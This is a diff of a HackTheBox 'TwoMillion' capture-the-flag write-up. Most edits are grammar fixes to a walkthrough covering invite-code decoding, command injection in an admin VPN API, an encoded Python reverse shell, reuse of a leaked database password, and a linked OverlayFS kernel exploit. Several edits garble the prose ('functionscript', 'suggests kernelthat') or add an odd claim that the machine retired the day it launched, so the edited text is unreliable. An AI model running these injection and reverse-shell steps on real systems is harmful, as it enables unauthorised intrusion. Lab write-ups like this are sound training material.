@@ -2,7 +2,7 @@
 
 ## Overview
 
-A Linux machine for celebrating 2M users on the HackTheBox platform.
+A Linux machine retired on the very day it launches for celebrating 2M users on the HackTheBox platform.
 
 {% embed url="https://app.hackthebox.com/machines/TwoMillion" %}
 
@@ -15,7 +15,7 @@ We see the hostname `2million.htb` in the HTTP response, so that we put it in ou
 <pre class="language-bash"><code class="lang-bash"><strong>$ curl -i http://&#x3C;IP>
 </strong></code></pre>
 
-The site is host behind a Nginx server, as we can see that in the reponse header `Server`. Thus we also fuzz the HTTP request header `Host`, and it seems that there's no other virtual host.
+The site is hosted behind an Nginx server, as we can see in the response header `Server`. Thus we also fuzz the HTTP request `Host` header, and it seems that there's no other virtual host.
 
 {% code overflow="wrap" %}
 ```bash
@@ -25,7 +25,7 @@ $ ffuf -u http://2million.htb -H 'Host: FUZZ.2million.htb' -w path_to_subdomains
 
 ### URL Path
 
-We can use devtool console with CSS selectors to find more URL paths to get more knowledge about this Web App.
+We can use `devtool` console with CSS selectors to find more URL paths to get more knowledge about this Web App.
 
 ```javascript
 document.querySelectorAll('[href]').forEach(x=>console.log(x.href)
@@ -74,7 +74,7 @@ From the pages `/invite` and `/register`, we see that a user must have the right
 
 ### Invite Code
 
-From the code contained in script `/js/inviteapi.min.js`, we see that we can get the invite code by calling the functiono `makeInviteCode` in page `/invite`.
+From the code contained in the functionscript `/js/inviteapi.min.js`, we see that we can get the invite code by calling the functiono `makeInviteCode` in page `/invite`.
 
 <figure><img src="../../.gitbook/assets/圖片.png" alt=""><figcaption><p>Calling the function <code>makeInviteCode</code> defined by a <code>eval</code> function in the script <code>/js/inviteapi.min.js</code>.</p></figcaption></figure>
 
@@ -97,7 +97,7 @@ decrypt('Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/va
 ```
 {% endcode %}
 
-Then we get the procedure to generate invite code:
+Then we get the procedure to generate the invite code:
 
 ```bash
 $ python3 decrypt.py 
@@ -120,7 +120,7 @@ We can download `.ovpn` file using related API `/api/v1/user/vpn/generate`, but 
 
 ### API Endpoints
 
-As an authenticated user, we can get a list of API endpoints via path `/api/v1` now:
+As an authenticated user, we can get a list of API endpoints via the path `/api/v1` now:
 
 {% code overflow="wrap" %}
 ```bash
@@ -192,7 +192,7 @@ We can authenticate as an admin now.
 
 ### VPN Generation
 
-As before, being a admin now, we can figure out the parameters needed to use the other endpoint `/api/v1/admin/vpn/generate`:
+As before, being an admin now, we can figure out the parameters needed to use the other endpoint `/api/v1/admin/vpn/generate`:
 
 {% code overflow="wrap" %}
 ```bash
@@ -202,13 +202,13 @@ $ curl -XPOST -H 'Cookie: PHPSESSID=<PHPSESSID>' http://2million.htb/api/v1/admi
 
 ### Command Injection
 
-The response contains a OpenVPN connection configuration. The configuration is generated via calling an extenal command, most possibly, in backend, so it's likely that the endpoint may have a command injection vulnerability.
+The response contains an OpenVPN connection configuration. The configuration is generated via calling an external command, most possibly, in the backend, so it's likely that the endpoint may have a command injection vulnerability.
 
 We can confirm our guess by inserting commands like `ping -c 1 <our_ip>` or `sleep 10`, etc.
 
 ### Reverse Shell
 
-To use the one line rerverse shell written in Python:
+To use the one-line reverse shell written in Python:
 
 {% code title="back.sh" overflow="wrap" %}
 ```bash
@@ -225,7 +225,7 @@ cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxwdHksb3M7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0
 ```
 {% endcode %}
 
-Finally, we insert it into the API endpoint to execute remote command and get our reverse shell back:
+Finally, we insert it into the API endpoint to execute a remote command and get our reverse shell back:
 
 {% code overflow="wrap" %}
 ```bash
@@ -270,7 +270,7 @@ DB_USERNAME=admin
 DB_PASSWORD=SuperDuperPass123
 ```
 
-Now we can login as `admin` via SSH into the machine with the above credential now.
+Now we can log in as `admin` via SSH into the machine with the above credential now.
 
 ## Privilege Escalation
 
@@ -297,10 +297,10 @@ HTB Godfather
 ```
 {% endcode %}
 
-The content suggests us that we may get privilege escalation via a kernerl vulnerability related to the OverlayFS implementation.
+The content suggests kernelthat we may get privilege escalation via a kernerl vulnerability related to the OverlayFS implementation.
 
 ### Exploit
 
-We can find and use the following exploit to get root.
+We can find and use the following exploit to get the root account.
 
 {% embed url="https://github.com/sxlmnwb/CVE-2023-0386" %}
